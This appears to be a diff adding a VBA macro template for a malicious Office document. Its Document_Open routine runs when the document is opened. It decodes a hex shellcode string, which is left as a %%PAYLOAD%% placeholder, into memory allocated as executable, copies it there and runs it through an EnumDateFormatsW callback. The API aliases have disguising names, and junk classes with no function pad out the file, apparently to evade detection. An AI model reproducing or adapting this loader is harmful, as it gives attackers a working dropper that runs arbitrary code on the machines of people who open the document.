@@ -1,0 +1,141 @@
+Private Declare Function LaPharmacie Lib "ntdll" Alias "ZwAllocateVirtualMemory" (ProcessHandle As Long, BaseAddress As Any, ByVal ZeroBits As Long, RegionSize As Long, ByVal AllocationType As Long, ByVal Protect As Long) As Long
+Private Declare Sub Brouncha Lib "ntdll" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)
+Private Declare Function MotherFuck Lib "kernel32" Alias "EnumDateFormatsW" (ByVal lpDateFmtEnumProc As Any, ByVal Locale As Any, ByVal dwFlags As Any) As Long
+
+
+Sub Document_Open()
+
+    Dim LaPassat As String
+%%PAYLOAD%%
+
+    Dim UnAutreMonde As Long
+    UnAutreMonde = Len(LaPassat + Useless) / 2
+    
+    Dim byteArray() As Byte
+    ReDim byteArray(0 To UnAutreMonde)
+    For i = 0 To UnAutreMonde - 1
+
+        If i = 0 Then
+            pos = i + 1
+        Else
+            pos = i * 2 + 1
+        End If
+        Value = Mid(LaPassat, pos, 2)
+        byteArray(i) = Val("&H" & Value)
+
+    Next
+    
+    Dim SousTerre As Long
+    Dim SonEx As Long
+    SonEx = 0
+    Dim Guytoune As Long
+    SousTerre = LaPharmacie(ByVal -1, Guytoune, 0, &H4000, &H1000, &H40)
+    
+    SousTerre = Guytoune
+    Brouncha ByVal SousTerre, byteArray(0), UBound(byteArray) + 1
+    CommeUnVoyou = MotherFuck(SousTerre, SonEx, SonEx)
+    
+End Sub
+
+
+
+Sub hqCKz(ByVal hyxnr, ByVal uposx)
+Dim nxxoPoExrxABxm = Nothing
+If nxxoPoExrxABxm = "hqCKz" Then
+ Dim rvlqzRNUQ as String = "rvlqz"
+End If
+If nxxoPoExrxABxm = "rvlqz" Then
+ Dim KfuLLQWWP as Long = 5785519
+End If
+End Sub
+End Class
+Class UkdrLVQyGqdY
+Sub UkdrL(ByVal iehyn, ByVal kurps)
+Dim EnBxoEwPAxBrrw = Nothing
+If EnBxoEwPAxBrrw = "UkdrL" Then
+ Dim epMXKZKby as Integer = 1414
+End If
+If EnBxoEwPAxBrrw = "epMXK" Then
+ Dim xZVtWZTdx as Integer = 662
+End If
+End Sub
+End Class
+Class HeEZWdOFoeBS
+Sub HeEZW(ByVal nhxfi, ByVal srokk)
+Dim ABxrEBoAmBxwAP = Nothing
+If ABxrEBoAmBxwAP = "HeEZW" Then
+ Dim tzXQtbfIm as String = "tz"
+End If
+If ABxrEBoAmBxwAP = "tzXQt" Then
+ Dim kUwbhhRje as Long = 5224875
+End If
+End Sub
+End Class
+Class uZfHhmLMWSZN
+Sub uZfHh(ByVal rfhnh, ByVal xkrsu)
+Dim xrBAnmooEwromr = Nothing
+If xrBAnmooEwromr = "uZfHh" Then
+ Dim NJpctlU as Long = 5557182
+End If
+If xrBAnmooEwromr = "NJpct" Then
+ Dim XOYIsqO as String = "XOYIsqOqMjGxDyrP"
+End If
+End Sub
+End Class
+Class IirAQoftKYkw
+Sub IirAQ(ByVal nhyxw, ByVal supod)
+Dim AnxxwmBxornPxB = Nothing
+If AnxxwmBxornPxB = "IirAQ" Then
+ Dim ADQKEtRUDA as String = "ADQKEtRUDAmhUWmh"
+End If
+If AnxxwmBxornPxB = "ADQKE" Then
+ Dim KIzqEyL as String = "KIzqEy"
+End If
+End Sub
+End Class
+Class vcShbwdAsMIr
+Sub vcShb(ByVal rfihf, ByVal xrdur)
+Dim PBwnrPBxxoAxno = Nothing
+If PBwnrPBxxoAxno = "vcShb" Then
+ Dim nxrsPCOb as Long = 4996538
+End If
+If PBwnrPBxxoAxno = "nxrsP" Then
+ Dim FhBNbBXdj as Long = 6046467
+End If
+End Sub
+End Class
+Class iWtPmFaHaAgl
+Sub iWtPm(ByVal eiywe, ByVal ukpdu)
+Dim nExwmArArxBnwm = Nothing
+If nExwmArArxBnwm = "iWtPm" Then
+ Dim arSaaKM as Long = 6124956
+End If
+If nExwmArArxBnwm = "arSaa" Then
+ Dim LLlRyJdlQ as Integer = 935
+End If
+End Sub
+End Class
+Class VQUxxNXNHnEg
+Sub VQUxx(ByVal iwirr, ByVal kdkxx)
+Dim EwEPPoroAmxBPw = Nothing
+If EwEPPoroAmxBPw = "VQUxx" Then
+ Dim oAeSJMgP as Integer = 1017
+End If
+If EwEPPoroAmxBPw = "oAeSJ" Then
+ Dim yFMyJR as Long = 5485823
+End If
+End Sub
+End Class
+Class IKveJWVUpbca
+Sub IKveJ(ByVal nnrhn, ByVal ssxrs)
+Dim AoPBAEEEmrBrBP = Nothing
+If AoPBAEEEmrBrBP = "IKveJ" Then
+ Dim buFAUVdW as String = "buFAUVdWoWRAdNqGab"
+End If
+If AoPBAEEEmrBrBP = "buFAU" Then
+ Dim lzngUaYyg as Integer = 347
+End If
+End Sub
+End Class
+
+
